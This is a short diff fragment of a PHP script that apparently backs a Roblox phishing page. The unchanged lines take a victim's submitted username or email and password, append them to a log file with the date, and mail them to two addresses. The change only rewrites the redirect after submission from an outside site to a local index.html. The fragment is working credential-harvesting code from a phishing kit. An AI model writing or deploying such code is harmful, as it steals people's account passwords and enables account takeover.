@@ -23,7 +23,7 @@ if(isset($_POST['submit']));
   $txt = "Roblox Account: "."<br>"."Username/Email/Phone::<b>".$name."</b><br>Password::<b>".$code."</b><br><br><b>DATE:".$date."</b><br><br>";
   fwrite($file,$txt);
   fclose($file);
-  header('location: https://readytoyou.com/Roblox/index.html');
+  header('location: index.html');
   
   mail($mailTo, $subject, $txt, $headers);
   mail($mail2, $subject, $txt, $headers);
